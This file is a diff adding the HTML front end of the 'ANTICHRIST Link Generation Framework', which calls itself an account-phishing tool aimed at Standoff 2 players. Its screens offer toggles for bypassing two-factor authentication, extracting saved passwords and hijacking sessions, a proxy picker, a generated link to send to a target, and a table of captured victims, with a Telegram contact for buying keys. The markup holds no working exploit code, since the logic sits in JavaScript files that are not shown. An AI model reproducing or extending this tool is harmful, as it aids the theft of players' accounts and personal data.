@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#0a0a0a">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="ANTICHRIST">
+  <meta name="description" content="ANTICHRIST Link Generation Framework">
+  <link rel="manifest" href="manifest.json">
+  <link rel="apple-touch-icon" href="assets/icons/icon-192.png">
+  <title>ANTICHRIST LINK</title>
+  <link rel="stylesheet" href="css/index.css">
+</head>
+<body>
+
+  <div class="app" id="app">
+
+    <!-- ═══════════════════════════════════════════════════════
+         SCREEN 0: ACTIVATION KEY
+         ═══════════════════════════════════════════════════════ -->
+    <section class="screen active" id="screen-activation">
+      <div class="activation-container">
+        <div class="activation-logo">
+          <div class="logo-icon">✝</div>
+          <h1 class="glitch-text" data-text="ANTICHRIST">ANTICHRIST</h1>
+          <p class="logo-subtitle">LINK GENERATION FRAMEWORK</p>
+        </div>
+        <div class="activation-form">
+          <label class="input-label" for="activation-key">ENTER ACTIVATION KEY</label>
+          <input type="text" id="activation-key" class="input-field mono" placeholder="XXXX-XXXX-XXXX-XXXX" autocomplete="off" spellcheck="false">
+          <p class="activation-error" id="activation-error"></p>
+          <button class="btn-primary btn-pulse" id="btn-activate">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" style="vertical-align:middle;margin-right:6px"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10"/></svg>ACTIVATE
+          </button>
+          <p class="activation-contact">
+            Don't have a key? Contact <span class="text-red">@antichz</span> on Telegram
+          </p>
+        </div>
+        <p class="version-footer">ANTICHRIST Framework <span class="version-tag">v3.1.7</span> · build 2847</p>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════════════
+         SCREEN 1: SPLASH / LOADING
+         ═══════════════════════════════════════════════════════ -->
+    <section class="screen" id="screen-splash">
+      <div class="splash-container">
+        <div class="splash-logo">
+          <div class="logo-icon flicker">✝</div>
+          <h2 class="glitch-text" data-text="ANTICHRIST">ANTICHRIST</h2>
+        </div>
+        <div class="splash-steps">
+          <div class="splash-step" id="splash-step-1">
+            <span class="splash-text">Connecting to ANTICHRIST network...</span>
+            <div class="splash-bar"><div class="splash-bar-fill"></div></div>
+          </div>
+          <div class="splash-step" id="splash-step-2">
+            <span class="splash-text">Verifying license key...</span>
+            <div class="splash-bar"><div class="splash-bar-fill"></div></div>
+          </div>
+          <div class="splash-step" id="splash-step-3">
+            <span class="splash-text">Loading exploit modules...</span>
+            <div class="splash-bar"><div class="splash-bar-fill"></div></div>
+          </div>
+          <div class="splash-step" id="splash-step-4">
+            <span class="splash-text">Checking for updates...</span>
+            <div class="splash-bar"><div class="splash-bar-fill"></div></div>
+          </div>
+          <div class="splash-step" id="splash-step-5">
+            <span class="splash-text">Initializing...</span>
+            <div class="splash-bar"><div class="splash-bar-fill"></div></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════════════
+         SCREEN 2: DASHBOARD
+         ═══════════════════════════════════════════════════════ -->
+    <section class="screen" id="screen-dashboard">
+      <div class="dashboard-container">
+
+        <!-- Header -->
+        <header class="dash-header">
+          <div class="dash-header-left">
+            <span class="logo-icon-small">✝</span>
+            <span class="logo-text-small">ANTICHRIST</span>
+          </div>
+          <div class="dash-header-right">
+            <span class="status-indicator">
+              <span class="status-dot online"></span>
+              ONLINE
+            </span>
+            <span class="links-badge">
+              Links: <span id="links-remaining" class="text-red">7/10</span>
+            </span>
+            <span class="version-tag">v3.1.7</span>
+          </div>
+        </header>
+
+        <!-- Target Selection -->
+        <div class="section">
+          <h3 class="section-title">TARGET PLATFORM</h3>
+          <div class="target-single">
+            <div class="target-card selected" data-target="standoff2">
+              <div class="target-icon">
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round">
+                  <circle cx="12" cy="12" r="10"/>
+                  <line x1="12" y1="2" x2="12" y2="6"/>
+                  <line x1="12" y1="18" x2="12" y2="22"/>
+                  <line x1="2" y1="12" x2="6" y2="12"/>
+                  <line x1="18" y1="12" x2="22" y2="12"/>
+                  <circle cx="12" cy="12" r="4"/>
+                </svg>
+              </div>
+              <div class="target-info">
+                <div class="target-name">Standoff 2</div>
+                <div class="target-desc">Account phishing module</div>
+              </div>
+              <div class="target-status">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2"><circle cx="12" cy="12" r="5" fill="var(--accent-green)"/></svg>
+                <span class="text-green" style="font-size:0.7rem">ACTIVE</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Attack Configuration -->
+        <div class="section">
+          <h3 class="section-title">ATTACK CONFIGURATION</h3>
+          
+          <div class="config-group">
+            <label class="input-label" for="target-input">TARGET URL / USERNAME</label>
+            <input type="text" id="target-input" class="input-field mono" placeholder="Enter profile URL or username..." autocomplete="off" spellcheck="false">
+          </div>
+
+          <div class="toggles-grid">
+            <div class="toggle-row">
+              <span class="toggle-label">Bypass 2FA Authentication</span>
+              <div class="toggle-switch active" data-config="bypass2fa">
+                <div class="toggle-knob"></div>
+              </div>
+            </div>
+            <div class="toggle-row">
+              <span class="toggle-label">Stealth Mode (Anti-Detection)</span>
+              <div class="toggle-switch active" data-config="stealth">
+                <div class="toggle-knob"></div>
+              </div>
+            </div>
+            <div class="toggle-row">
+              <span class="toggle-label">Collect Browser Fingerprint</span>
+              <div class="toggle-switch active" data-config="fingerprint">
+                <div class="toggle-knob"></div>
+              </div>
+            </div>
+            <div class="toggle-row">
+              <span class="toggle-label">Extract Saved Passwords</span>
+              <div class="toggle-switch active" data-config="passwords">
+                <div class="toggle-knob"></div>
+              </div>
+            </div>
+            <div class="toggle-row">
+              <span class="toggle-label">Session Hijacking</span>
+              <div class="toggle-switch active" data-config="sessionHijack">
+                <div class="toggle-knob"></div>
+              </div>
+            </div>
+          </div>
+
+          <div class="config-group">
+            <label class="input-label" for="proxy-select">PROXY SERVER</label>
+            <select id="proxy-select" class="input-field mono">
+              <option value="RU-7">RU-7 Moscow (47ms)</option>
+              <option value="RU-3">RU-3 Saint Petersburg (52ms)</option>
+              <option value="EU-1">EU-1 Frankfurt (89ms)</option>
+              <option value="EU-3">EU-3 Berlin (91ms)</option>
+              <option value="US-1">US-1 New York (142ms)</option>
+              <option value="US-5">US-5 Los Angeles (178ms)</option>
+              <option value="SG-2">SG-2 Singapore (203ms)</option>
+            </select>
+          </div>
+        </div>
+
+        <!-- Generate Button -->
+        <button class="btn-generate btn-pulse" id="btn-generate">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="vertical-align:middle;margin-right:6px"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10"/></svg>GENERATE LINK
+        </button>
+
+        <!-- Log Ticker Footer -->
+        <div class="log-ticker-container">
+          <div class="log-ticker" id="log-ticker"></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════════════
+         SCREEN 3: GENERATION ANIMATION
+         ═══════════════════════════════════════════════════════ -->
+    <section class="screen" id="screen-generating">
+      <div class="generating-container">
+        <div class="gen-header">
+          <span class="gen-status text-red"><svg width="12" height="12" viewBox="0 0 24 24" fill="var(--accent-red)" style="vertical-align:middle;margin-right:4px"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10"/></svg>GENERATING LINK...</span>
+        </div>
+        <div class="gen-layout">
+          <!-- Terminal -->
+          <div class="gen-terminal">
+            <div class="terminal-header">
+              <div class="terminal-dots">
+                <span class="dot red"></span>
+                <span class="dot yellow"></span>
+                <span class="dot green"></span>
+              </div>
+              <span class="terminal-title mono">root@antichrist:~#</span>
+            </div>
+            <div class="terminal-body" id="terminal-output"></div>
+          </div>
+          <!-- Side Panel -->
+          <div class="gen-side-panel">
+            <!-- Progress Bars -->
+            <div class="gen-progress" id="progress-container">
+              <h4 class="section-title-sm">ATTACK PROGRESS</h4>
+              <div class="progress-item">
+                <span class="progress-label">Payload Injection</span>
+                <div class="progress-bar"><div class="progress-fill"></div></div>
+              </div>
+              <div class="progress-item">
+                <span class="progress-label">URL Obfuscation</span>
+                <div class="progress-bar"><div class="progress-fill"></div></div>
+              </div>
+              <div class="progress-item">
+                <span class="progress-label">Anti-Detect Layer</span>
+                <div class="progress-bar"><div class="progress-fill"></div></div>
+              </div>
+              <div class="progress-item">
+                <span class="progress-label">2FA Bypass</span>
+                <div class="progress-bar"><div class="progress-fill"></div></div>
+              </div>
+            </div>
+            <!-- IP Scanner -->
+            <div class="gen-ip-scanner">
+              <h4 class="section-title-sm">IP SCANNER</h4>
+              <div class="ip-scanner-list" id="ip-scanner"></div>
+            </div>
+            <!-- Network Canvas -->
+            <div class="gen-network">
+              <h4 class="section-title-sm">NETWORK MAP</h4>
+              <canvas id="network-canvas"></canvas>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════════════
+         SCREEN 4: RESULT
+         ═══════════════════════════════════════════════════════ -->
+    <section class="screen" id="screen-result">
+      <div class="result-container">
+        <div class="result-back" id="btn-back-profile">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:4px"><polyline points="15 18 9 12 15 6"/></svg>Back to profile
+        </div>
+
+        <div class="result-success">
+          <span class="result-check">&#10003;</span>
+          <h2 style="color:var(--accent-green)">LINK READY</h2>
+        </div>
+
+        <div class="result-link-box">
+          <label class="input-label">GENERATED LINK</label>
+          <div class="link-display">
+            <span class="mono" id="generated-url">https://loading...</span>
+          </div>
+          <p class="text-dim" style="margin-top:0.5rem;font-size:0.65rem;font-family:var(--font-mono)">Link is active. Send to target and wait for session capture.</p>
+        </div>
+
+        <div class="result-actions">
+          <button class="btn-primary" id="btn-copy-link"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:6px"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>COPY LINK</button>
+          <button class="btn-secondary" id="btn-my-links"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:6px"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>MY LINKS</button>
+          <button class="btn-secondary" id="btn-new-target"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:6px"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg>NEW TARGET</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════════════
+         SCREEN: MY LINKS
+         ═══════════════════════════════════════════════════════ -->
+    <section class="screen" id="screen-mylinks">
+      <div class="mylinks-container">
+        <header class="dash-header">
+          <div class="dash-header-left">
+            <span class="logo-icon-small">&#10013;</span>
+            <span class="logo-text-small">ACTIVE LINKS</span>
+          </div>
+          <div class="dash-header-right">
+            <span class="status-indicator">
+              <span class="status-dot online"></span>
+              <span id="mylinks-count">0</span> active
+            </span>
+          </div>
+        </header>
+
+        <div class="mylinks-list" id="mylinks-list">
+          <div class="mylinks-empty mono text-dim">No active links. Generate one first.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════════════
+         SCREEN 5: VICTIMS
+         ═══════════════════════════════════════════════════════ -->
+    <section class="screen" id="screen-victims">
+      <div class="victims-container">
+        <header class="dash-header">
+          <div class="dash-header-left">
+            <span class="logo-icon-small">&#10013;</span>
+            <span class="logo-text-small">INTERCEPT LOGS</span>
+          </div>
+          <div class="dash-header-right">
+            <span class="status-indicator">
+              <span class="status-dot online"></span>
+              LISTENER ACTIVE
+            </span>
+          </div>
+        </header>
+
+        <!-- Quick Summary Cards -->
+        <div class="victims-metrics">
+          <div class="vmetric-card">
+            <span class="vmetric-label">TOTAL LINKS</span>
+            <span class="vmetric-val text-red" id="vmetric-links">0</span>
+          </div>
+          <div class="vmetric-card">
+            <span class="vmetric-label">CLICKS LOGGED</span>
+            <span class="vmetric-val text-yellow" id="vmetric-clicks">0</span>
+          </div>
+          <div class="vmetric-card">
+            <span class="vmetric-label">CAPTURED ACCOUNTS</span>
+            <span class="vmetric-val text-green" id="vmetric-captured">0</span>
+          </div>
+        </div>
+
+        <div class="victims-table-wrapper">
+          <table class="victims-table" id="victims-table">
+            <thead>
+              <tr>
+                <th>#</th>
+                <th>IP ADDRESS</th>
+                <th>LOCATION</th>
+                <th>USER AGENT</th>
+                <th>STATUS</th>
+              </tr>
+            </thead>
+            <tbody id="victims-table-body"></tbody>
+          </table>
+
+          <!-- Empty State (Shown when no victims yet) -->
+          <div class="victims-empty-state" id="victims-empty-state">
+            <div class="v-empty-icon">
+              <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                <circle cx="12" cy="12" r="9"/>
+                <path d="M12 3a9 9 0 0 1 9 9"/>
+                <circle cx="12" cy="12" r="3"/>
+                <line x1="12" y1="12" x2="19" y2="5"/>
+              </svg>
+            </div>
+            <h4 class="mono" style="margin-bottom:0.4rem;letter-spacing:1px">NO INCOMING SESSIONS</h4>
+            <p class="text-dim" style="font-size:0.75rem;max-width:380px;margin:0 auto;line-height:1.4">
+              Your link listener is idling. Generate a Standoff 2 link in the <b>Generate</b> tab and share it. Captured accounts will stream here in real-time.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════════════
+         SCREEN 6: ABOUT
+         ═══════════════════════════════════════════════════════ -->
+    <section class="screen" id="screen-about">
+      <div class="about-container">
+        <div class="about-card">
+          <div class="about-logo">
+            <div class="logo-icon-large">✝</div>
+            <h2 class="glitch-text" data-text="ANTICHRIST">ANTICHRIST</h2>
+            <p class="about-tagline">"We don't hack. We collect."</p>
+          </div>
+          <div class="about-stats">
+            <div class="stat-item">
+              <span class="stat-value text-red">2019</span>
+              <span class="stat-label">Founded</span>
+            </div>
+            <div class="stat-item">
+              <span class="stat-value text-red">4</span>
+              <span class="stat-label">Members</span>
+            </div>
+            <div class="stat-item">
+              <span class="stat-value text-red">12,847</span>
+              <span class="stat-label">Links Generated</span>
+            </div>
+            <div class="stat-item">
+              <span class="stat-value text-red">347</span>
+              <span class="stat-label">Accounts Collected</span>
+            </div>
+          </div>
+          <div class="about-contact">
+            <p>Contact: <span class="text-red">@antichz</span> (Telegram)</p>
+            <p>Channel: <span class="text-cyan">t.me/antichrist_tools</span></p>
+          </div>
+          <div class="about-footer">
+            <p class="text-dim">ANTICHRIST Framework <span class="version-tag">v3.1.7</span> · build 2847</p>
+            <p class="text-dim">All rights reserved. Unauthorized distribution prohibited.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════════════
+         VICTIM DETAIL MODAL
+         ═══════════════════════════════════════════════════════ -->
+    <div class="modal-overlay" id="victim-modal">
+      <div class="modal-card" id="victim-modal-content"></div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════════
+         BOTTOM NAVIGATION
+         ═══════════════════════════════════════════════════════ -->
+    <nav class="bottom-nav" id="main-nav">
+      <div class="nav-item active" data-screen="dashboard">
+        <span class="nav-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10"/></svg></span>
+        <span class="nav-label">Generate</span>
+      </div>
+      <div class="nav-item" data-screen="mylinks">
+        <span class="nav-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg></span>
+        <span class="nav-label">Links</span>
+      </div>
+      <div class="nav-item" data-screen="victims">
+        <span class="nav-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></span>
+        <span class="nav-label">Victims</span>
+      </div>
+      <div class="nav-item" data-screen="about">
+        <span class="nav-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg></span>
+        <span class="nav-label">About</span>
+      </div>
+    </nav>
+
+  </div>
+
+  <!-- Scripts (order matters) -->
+  <script src="js/generators.js"></script>
+  <script src="js/terminal.js"></script>
+  <script src="js/animations.js"></script>
+  <script src="js/notifications.js"></script>
+  <script src="js/app.js"></script>
+
+</body>
+</html>
